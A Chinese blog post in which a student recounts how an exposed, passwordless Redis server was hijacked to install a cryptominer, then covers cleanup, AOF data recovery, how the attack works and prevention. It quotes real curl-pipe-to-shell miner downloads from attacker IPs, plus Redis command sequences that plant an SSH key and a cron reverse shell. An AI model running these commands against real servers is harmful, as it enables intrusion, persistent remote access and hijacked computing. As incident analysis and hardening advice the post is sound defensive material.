---
title:      "谈一个Redis漏洞——记一次服务器被挖矿经历"
date:       2021-11-29
author:     "JessieLin"
tags:
     - 19级
     - Java
---

#   谈一个Redis漏洞——记一次服务器被挖矿经历

> 服务器：阿里云轻量应用服务器
>
> 系统：centos 8.2

## 1 事件起因
2021年11月21日中午12：37分左右，在做软工作业的我突然想直接用ARDM(一个Redis可视化工具)连连服务器上的Redis看看里面现在有啥（因为之前写码的时候忘记设置过期时间了，里面有不少没啥用的key)，然后直接去服务器控制台打开6379端口（之前也这么直连过一次但没出事），因为我知道Redis没有密码，所以我一小会直接用完马上就关闭了6379端口。

13：14分，前端突然和我说后台连不上去了报Error，我试了下我也连不上去，域名访问全部失效，服务器挂了？，然后又试了下IP直接访问，可以访问，看来是转发层挂了。然后连服务器一看nginx的状态是failed，当时就在想nginx这么稳定竟然也会挂啊。然后试了下服务好了，就睡觉了，结果下午四点多突然前端又和我说服务又挂了，我直接懵了nginx今天抽风了？？？？然后我又重启了一遍nginx。结果很快啊大概不到半个小时它又又又挂了，我开始觉得不对劲了，啥情况啊？我systemctl nginx status一看，failed，但是这次我仔细看了failed的原因，killed？kill -9？这不是意味着进程被杀了嘛，内存不够？看了下服务器内存占用，好像空间也够啊，（这时候我看到CPU占用一直50%多，还以为阿里云抽风了）。这时候我意识到服务器是不是被人攻击了？后台是不是有程序一直在kill nginx？然后我输入ps aux一看，不看不要紧，一看就看到一个

> ```
> /bin/sh -c curl -fsSL http://45.133.203.192/cleanfda/init.sh | sh
> ```

的进程，我在想，这IP是啥啊，看着好陌生。结果一百度，就百度到了Redis被攻击注入挖矿脚本。突然前面的一切都解释通了...服务器被人注入挖矿脚本。然后我赶紧kill -9把这个进程kill了。

然后又百度了一下，让我去看定时任务，好嘛，那我crontab -l一看，就看到一个sh /etc/newinit.sh，想想我以前肯定没弄过定时任务，果断cd到etc下删除，结果报operation not permiited。就奇了怪了我是root用户，居然还有我root删不掉的东西？百度了一下原来linux还有chattr lsattr这种给文件附加额外隐藏属性的命令，一输又报not found，需要先yum -y install e2fsprogs才能用。下了后用lsattr查看这个文件，

>```
> lsattr newinit.sh
> ----i-----a---- newinit.sh (可能a的位置不对，百度也百度不到，当时没截图)
>```

果然被附加了ia的锁，用

>```
> chattr -ia newinit.sh
>```

就能解开文件的锁，然后就可以用rm -rf删掉文件了。这时候其实服务器CPU已经降下来了。可以用top命令检查CPU情况，确认一下没有其他异常的进程。但是这时服务器仍然残留着脚本和后门，请看第二部分。



*ARDM （Another Redis Desktop Manager，一个很好用的免费的Redis可视化管理工具，可以在github上找到）

## 2 被攻击后的处理

注意！如果你的Redis访问量比较大或者aof文件重新触发的阈值比较低，在受到攻击后请立刻关闭redis，避免aof文件被重写造成数据无法恢复的后果。

先用top指令或ps aux指令或pstree查看异常进程，kill掉对应进程。注意这些指令很可能被掉包导致异常，如果指令无法执行，请先执行下面的步骤。

根据百度到的全部信息，我检查了以下内容

+ /etc/newinit.sh 执行挖矿任务的脚本，同时会kill掉其他进程，比如阿里云的云盾、nginx、其他挖矿进程（挖矿也内卷），并添加sshkey到服务器中。

  + 可以先重启阿里云的云盾等服务，可以下载看挖矿脚本的前面几十行，一般都是先关掉防护，对应重新打开相应服务即可。

+ /etc/cron.d 定时任务路径，检查里面是否有异常文件，如果没设置过建议全删

  + 还有cron.daily hourly...等

+ /etc/ 下是否有异常的脚本，或者叫zzh之类的文件，如果有删除即可，删不了先用lsattr看看有哪些隐藏属性，然后用chattr解锁，还有删不了的用chmod命令试试看。再不行可以试试chattr +ai 文件名重新加锁，然后再重新解锁，或许就能删除了。

+ **/root/.ssh/authorized_keys **  ssh文件，一般会被植入攻击者的公钥，记得删除。如果下面有攻击者的公钥并且服务器允许ssh，那么不用密码就可以直接进入服务器，非常危险。我在里面发现了和网络上那些被攻击的服务器一样的ssh key，果断直接删除整个authorized_keys文件

+ **/root/.ssh/known_hosts**  中是否有未知的hosts

+ /etc/sysconfig/iptables 可疑地址和端口

+ /etc/rc.local，/etc/rc.sysinit，/etc/inittab，/etc/profile 等开机启动项中，是否有异常。

+ systemctl list-unit-files 查看是否有异常的开机服务，如有通过chkconfig 服务名 off关闭

+ 可以find一下所有的.sh结尾的文件 确认一下没有异常的文件。

+ 可以ll 查看文件详细信息，通过检查文件的时间判断是不是攻击者写入的文件

+ 备份挖矿的脚本，分析挖矿脚本内容，重开被脚本杀掉的其他服务。我通过分析脚本发现一些命令被mv到其他文件夹了，如有请恢复。

  + 由于挖矿脚本中涉及到的内容非常长，此处不再列出，[可以点击这里查看其它博主的详细分析](https://www.renfei.net/posts/1003501),或自己下载对应脚本分析其中的内容。

+ 重启服务器，检查服务器状态。

    

    
  
    

## 3 Redis的恢复
被攻击后Redis的数据会被清空，并被写入特殊的key，可以keys  \* 查看所有的keys，可能有backup1之类的key，全部删掉，然后kill掉redis。此时redis的rdb备份文件路径一定被篡改到了crontab或者.ssh之类的文件夹里，不过只要配置文件没被改动，重启后会直接按配置文件重新加载。你需要找到redis的aof文件，可以下下来用vscode之类的工具打开（对vim操作熟悉的也可以直接用vim操作），直接查找flushall来定位位置，然后把那一块附近的异常代码删除。

通常如下。

```
flushall 
*3  #*3表示下面有三个操作字符串 此处是set backup1 */2那一坨
$3 # $3表示下面那个字符串长度为3
set
$7
backup1
$75



*/2 * * * * cd1 -fsSL http://194.87.139.103:8080/cleanfda/init.sh | sh

......

```

找到后根据aof文件的规则删除，少删了\*或者$也没事，关键是把相关的flush指令和set指令干掉。干掉后，需要用

```
./redis-check-aof --fix appendonly.aof
```

来修复aof文件，按y确认即可修复。用这个aof文件覆盖之前的aof文件即可。然后启动或重启redis，默认redis会从AOF文件中恢复数据。这样操作后你的大部分数据应该都能回来。

如果你没开AOF，那你的数据多半是寄了。RDB文件是二进制文件，如果你想通过改RDB文件来恢复，那难度有点高。

## 4 攻击原理分析

Redis如果没有设置密码并且bind是0.0.0.0并且protected-mode为no并且以root等较高权限运行，那么可以直接外网远程连接操作redis写入文件到任意路径。通常来说，原理是这样的

```
192.168.63.130:6379> config set dir /root/.ssh/
OK
192.168.63.130:6379> config set dbfilename authorized_keys
OK
192.168.63.130:6379> set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n"
OK
192.168.63.130:6379> save
OK
```

或者

```
# redis-cli 
127.0.0.1:6379> CONFIG SET dir /var/spool/cron <--切换到定时任务目录
OK
127.0.0.1:6379> CONFIG SET dbfilename root <--生成一个名为root的文件
OK
127.0.0.1:6379> set payload "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/10.0.2.5/9999  0>&1\n\n"  <--设置反弹shell
OK
127.0.0.1:6379> save 
```

以上均来自网络。原理是redis可以动态改变配置，通过改变路径到相应的文件夹下并设置RDB文件名，然后写入key并save，这个key就被保存到相应文件里了。神奇的是刚好key的value写入RDB后不会乱码并且能正确的被centos解析出来。第一种是写入sshkey，写入成功后可以免密ssh登录目标主机。第二种是通过向系统写入root的定时脚本，通过脚本反弹shell，把shell暴露给外网（如果是ubuntu的话，第二种方式可能不太行）。只要能操作目标主机的shell那是想干啥干啥。由于redis具有root权限，所以以上操作均能正常执行。

还有一种方式就是redis的rdb文件切到crontab定时任务目录下，直接写入wget命令获取远程主机脚本并sh，等crontab下的命令被定时执行时就会触发。本人应该是被此种方式攻击。

总之，Redis攻击的原理无外乎改变rdb文件路径来往对应路径写入所需的内容。

## 5 预防

通过本漏洞攻击需要满足4个条件

+ 1.Redis端口对外网暴露
+ 2.Redis没有设置强密码（弱密码很可能被撞开）
+ 3.Redis以较高的权限运行
+ 4.Redis配置中 bind属性为0.0.0.0并且关闭了protected-mode

因此预防攻击，建议

+ 给Redis设置强密码，尤其是需要外网访问的情况下。服务器不少端口每天都会被很多扫描工具轮番照顾，没有密码，哪怕只开放一小会中招的几率也非常大，不要存在侥幸心理。
+ 如果可能，bind尽量不要设置为0.0.0.0。
+ 没有外网使用的情况下，尽量关闭相应的防火墙端口，避免被暴力试出密码，**redis本身没有对输错密码的次数做限制**。

+ 建立低权限账户，授予其读取写入执行redis文件夹权限，并关闭其登录系统的权限。这样即使redis被攻破，攻击者也只能破坏你的redis中的数据，无法对系统其它部分造成影响。

## 6 吐槽

阿里云轻量应用服务器的防御应该不太行，这个脚本应该暴露好久了，结果这脚本在我服务器挖了那么久（大概四个小时）居然一点警报也没有，问客服也只是让我看看crontab下有没有定时任务让我清掉，隔壁腾讯云反倒能给出警报来。可能因为这个脚本很“贴心”的给我设置了50%的CPU占用上限导致没触发阿里云的机制吧。
